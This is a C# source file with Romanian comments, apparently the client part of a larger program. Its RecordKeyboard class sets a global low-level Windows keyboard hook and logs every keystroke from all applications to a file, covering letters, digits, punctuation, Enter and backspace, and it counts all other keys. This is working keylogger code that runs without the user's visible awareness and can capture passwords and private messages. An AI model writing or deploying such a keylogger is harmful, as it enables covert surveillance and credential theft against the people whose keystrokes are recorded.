using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace ClientAps
{
    class RecordKeyboard
    {
        //MEMBRII
        private static LowLevelKeyboardProc _proc = HookCallback;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr _hookID = IntPtr.Zero;

        public static int val;
        public static string filename;
        public static long nr_diff_keys=0;
        private static int delay = 0;
        private static int predCh;


        //METODE

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void CatchMessages(string filenameKEYS)
        {
            filename = filenameKEYS;
            _hookID = SetHook(_proc);
            InterceptMessageWindows.MSG msg;
            UIntPtr timerId = InterceptMessageWindows.SetTimer(IntPtr.Zero, UIntPtr.Zero, 10000);
            InterceptMessageWindows.GetMessage(out msg, IntPtr.Zero, 0, 0);
            InterceptMessageWindows.KillTimer(IntPtr.Zero, timerId);

            File.AppendAllText(filenameKEYS, "\n" + nr_diff_keys.ToString());
            nr_diff_keys = 0;
           
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
      
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                val = vkCode;
                if (delay != 0)
                {
                    if(predCh==160 && val==187)
                    {
                        delay = 0;
                        File.AppendAllText(filename, "+");
                    }
                    else if (predCh == 8)
                    {
                        File.AppendAllText(filename, "{erase}");
                    }
                    else if (predCh == 13)
                    {
                        File.AppendAllText(filename, "\n");
                    }
                    else if ((predCh >= 65 && predCh <= 90) || (predCh >= 48 && predCh <= 57))
                    {
                        char a = (char)predCh;
                        File.AppendAllText(filename, a.ToString().ToLower());
                    }
                    else if (predCh > 185 && predCh < 191)
                    {
                        File.AppendAllText(filename, analize_value(predCh).ToString().ToLower());
                    }
                    else if ((predCh == 13) || (predCh == 32) || (predCh == 9))
                    {
                        char a = (char)predCh;
                        File.AppendAllText(filename, a.ToString().ToLower());
                    }
                    else
                    {
                        nr_diff_keys += 1;
                    }

                    predCh = val;
                }
                else
                {
                    delay = 1;
                    predCh=val;
                }
               // Console.WriteLine(vkCode);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static char analize_value(int dec)
        {
            switch (dec)
            {
                case 186:
                    return ';';
                case 187:
                    return '=';
                case 188:
                    return ',';
                case 189:
                    return '-';
                case 190:
                    return '.';
                default:
                    return (char)dec;
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
